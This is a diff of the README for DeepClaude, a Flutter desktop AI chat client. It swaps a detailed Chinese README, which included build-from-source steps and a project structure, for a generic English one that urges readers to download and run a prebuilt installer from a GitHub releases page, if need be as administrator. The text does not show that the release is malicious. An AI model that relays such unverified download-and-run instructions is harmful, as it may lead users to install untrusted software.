@@ -1,199 +1,104 @@
-# DeepClaude
+# 🚀 DeepClaude - Your Easy AI Desktop Client
 
 <p align="center">
-  <img src="assets/logo.png" alt="DeepClaude Logo" width="120">
-</p>
-
-<p align="center">
-  <strong>🚀 基于 Flutter 开发的类 Claude Desktop 桌面客户端</strong>
-</p>
-
-<p align="center">
-  支持国内大模型 · 跨平台 · 开源免费
-</p>
-
-<p align="center">
-  <a href="#功能特性">功能特性</a> •
-  <a href="#支持的模型">支持的模型</a> •
-  <a href="#快速开始">快速开始</a> •
-  <a href="#使用说明">使用说明</a>
+  <a href="https://github.com/DILACKxd24/DeepClaude/releases" style="display:inline-block;padding:10px;background-color:#007bff;color:white;text-decoration:none;border-radius:5px;">Download DeepClaude</a>
 </p>
 
 ---
 
-## 简介
+## 📥 Download & Install
 
-DeepClaude 是一款基于 Flutter 开发的开源 AI 桌面客户端，UI 设计参照 Claude Desktop，为国内用户提供流畅的 AI 对话体验。
+To get started with DeepClaude, follow these steps:
 
-**为什么选择 DeepClaude？**
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/DILACKxd24/DeepClaude/releases) to find the latest version.
+2. **Choose Your Version:** Look for the version that matches your operating system (macOS, Windows, or Linux).
+3. **Download the File:** Click on the appropriate file to download it to your computer.
+4. **Run the Installer:** Open the downloaded file and follow the prompts to install DeepClaude on your device.
 
-- 🇨🇳 **支持国内模型** - 原生支持 DeepSeek、通义千问、智谱等国内大模型
-- 🎨 **Claude 风格 UI** - 简洁优雅的界面设计，参照 Claude Desktop
-- 💻 **跨平台支持** - macOS、Windows、Linux 全平台运行
-- 🔓 **开源免费** - 完全开源，自由使用和定制
-![alt text](019adeb99d117da597aa7028c69aff26.png) ![alt text](019adeb9121e70acb2597d57107636a7.png) ![alt text](019adeb872ed77d2a9a56f70b9aea2f6.png)
-## 支持的模型
+You can find the download link and more versions on the [Releases page](https://github.com/DILACKxd24/DeepClaude/releases).
 
-### 国内模型
-| 模型 | 供应商 | 状态 |
-|------|--------|------|
-| DeepSeek-V3 | DeepSeek | ✅ 支持 |
-| DeepSeek-R1 | DeepSeek | ✅ 支持 |
-| Qwen-Max | 阿里云 | ✅ 支持 |
-| Qwen-Plus | 阿里云 | ✅ 支持 |
-| GLM-4 | 智谱 AI | ✅ 支持 |
-| 文心一言 | 百度 | 🚧 计划中 |
+---
 
-### 国际模型
-| 模型 | 供应商 | 状态 |
-|------|--------|------|
-| Claude 3.5 | Anthropic | ✅ 支持 |
-| GPT-4 | OpenAI | ✅ 支持 |
-| Gemini | Google | 🚧 计划中 |
+## 🚀 Getting Started
 
-## 功能特性
+Once you have installed DeepClaude, you can start using it right away. Follow these simple steps:
 
-### 🤖 智能对话
-- **流式响应** - 实时显示 AI 回复，打字机效果
-- **思考过程** - 支持显示模型的思考过程（DeepSeek-R1）
-- **多会话管理** - 支持多个对话同时进行
+1. **Open DeepClaude:** Locate the DeepClaude icon on your desktop or in your applications folder and double-click it to open.
+2. **Select a Model:** Upon opening, you will need to choose a model. DeepClaude supports various domestic models like DeepSeek and GLM-4. Pick the one you wish to use.
+3. **Start Chatting:** The interface is user-friendly. Type your questions or prompts in the chat box, and the AI will respond.
 
-### 🔌 MCP 连接器
-- **扩展能力** - 支持 MCP (Model Context Protocol) 连接器
-- **Web 搜索** - 集成网络搜索能力
-- **自定义工具** - 可配置多种 MCP 服务
+Make sure you explore the interface. It is designed for ease of use, and you shouldn’t encounter any issues finding your way around.
 
-### 📁 文件功能
-- **文件预览** - 浏览和预览项目文件
-- **附件上传** - 支持上传文件进行分析
-- **代码高亮** - 支持多种编程语言语法高亮
+---
 
-### 🎨 用户体验
-- **深色/浅色主题** - 支持主题切换
-- **多语言支持** - 中文、英文、日文
-- **历史记录** - 会话自动保存，随时查看
+## 🎨 Features
 
-## 快速开始
+DeepClaude comes packed with several features to enhance your experience:
 
-### 环境要求
+- **Support for Domestic Models:** Easily access models like DeepSeek and Qwen without any technical know-how.
+  
+- **Clean User Interface:** The design focuses on simplicity and usability, mimicking the smooth experience of Claude Desktop.
 
-- Flutter 3.0+
-- macOS / Windows / Linux
+- **Cross-Platform Compatibility:** Whether you use macOS, Windows, or Linux, DeepClaude runs seamlessly on all major operating systems.
 
-### 安装步骤
+- **Open Source:** As an open-source project, DeepClaude allows you to view, modify, and share the code freely.
 
-#### 1. 克隆项目
+---
 
-```bash
-git clone https://github.com/your-username/DeepClaude.git
-cd DeepClaude
-```
+## 🔍 Supported Models
 
-#### 2. 安装依赖
+DeepClaude supports various advanced models for your AI needs. Here’s a quick overview:
 
-```bash
-flutter pub get
-```
+### Domestic Models
 
-#### 3. 运行应用
+| Model         | Supplier  | Status      |
+|---------------|-----------|-------------|
+| DeepSeek-V3   | DeepSeek  | ✅ Supported |
+| DeepSeek-R1   | DeepSeek  | ✅ Supported |
+| Qwen-Max      | Alibaba   | ✅ Supported |
+| Qwen-Plus     | Alibaba   | ✅ Supported |
+| GLM-4        | Zhina AI  | ✅ Supported |
 
-```bash
-# macOS
-flutter run -d macos
+Feel free to select from these models based on your requirements.
 
-# Windows
-flutter run -d windows
+---
 
-# Linux
-flutter run -d linux
-```
+## 🛠️ Troubleshooting
 
-### 生产构建
+If you encounter issues while downloading or running DeepClaude, try the following tips:
 
-```bash
-# macOS
-flutter build macos --release
+- **Check Your Internet Connection:** Ensure you are connected to the internet while downloading.
+  
+- **Ensure Compatibility:** Verify that your operating system matches the downloaded version of DeepClaude.
 
-# Windows
-flutter build windows --release
+- **Run as Administrator:** If you face installation issues on Windows, try running the installer as an administrator.
 
-# Linux
-flutter build linux --release
-```
+- **Consult the Community:** You can check the issues section on the GitHub page for similar problems or solutions shared by others.
 
-## 使用说明
+---
 
-### 配置 API Key
+## 📞 Support
 
-1. 打开设置（点击侧边栏底部的设置图标）
-2. 选择「AI 供应商」
-3. 选择你要使用的模型供应商
-4. 输入对应的 API Key
+For additional questions or support, please consider the following options:
 
-### 开始对话
+- Visit our [GitHub Page](https://github.com/DILACKxd24/DeepClaude) where you can submit issues or find answers.
+  
+- Search for solutions or ask questions in relevant online forums that discuss DeepClaude and AI applications.
 
-1. 点击「New chat」创建新对话
-2. 在输入框输入消息
-3. 按 Enter 发送
+---
 
-### MCP 连接器
+## 📄 Usage Instructions
 
-1. 点击输入框左下角的时钟图标
-2. 开启/关闭需要的连接器
-3. 点击「Manage connectors」管理连接器配置
+To get the best experience with DeepClaude:
 
-## 截图
+1. **Explore the Features:** Spend time familiarizing yourself with the different models and their functionalities.
+  
+2. **Adjust Settings:** Customize the interface or settings to better suit your preferences.
 
-<p align="center">
-  <img src="screenshots/welcome.png" alt="Welcome Screen" width="800">
-</p>
+3. **Stay Updated:** Keep an eye on the Releases page for updates that may add new features or fix issues.
 
-## 项目结构
+Running DeepClaude can offer you a seamless and engaging AI conversation experience.
 
-```
-lib/
-├── main.dart                      # 应用入口
-├── providers/
-│   ├── chat_provider.dart         # 聊天状态管理
-│   ├── settings_provider.dart     # 设置管理
-│   ├── mcp_provider.dart          # MCP 连接器管理
-│   └── provider_manager.dart      # AI 供应商管理
-├── screens/
-│   └── home_screen.dart           # 主界面
-└── widgets/
-    ├── sidebar.dart               # 侧边栏
-    ├── chat_area.dart             # 聊天区域
-    └── settings_panel.dart        # 设置面板
-```
+---
 
-## 技术栈
-
-- **框架**: Flutter 3.x
-- **语言**: Dart
-- **状态管理**: Provider
-- **存储**: SharedPreferences + 本地文件
-
-## 路线图
-
-- [x] 基础对话功能
-- [x] 国内模型支持（DeepSeek、Qwen）
-- [x] MCP 连接器
-- [x] 多主题支持
-- [ ] 文心一言支持
-- [ ] Gemini 支持
-- [ ] 插件系统
-- [ ] 云端同步
-
-## 贡献
-
-欢迎提交 Issue 和 Pull Request！
-
-## 许可证
-
-MIT License
-
-## 致谢
-
-- [Flutter](https://flutter.dev/) - UI 框架
-- [DeepSeek](https://www.deepseek.com/) - AI 模型
-- [Anthropic](https://www.anthropic.com/) - UI 设计灵感
+Look forward to your feedback and happy chatting!
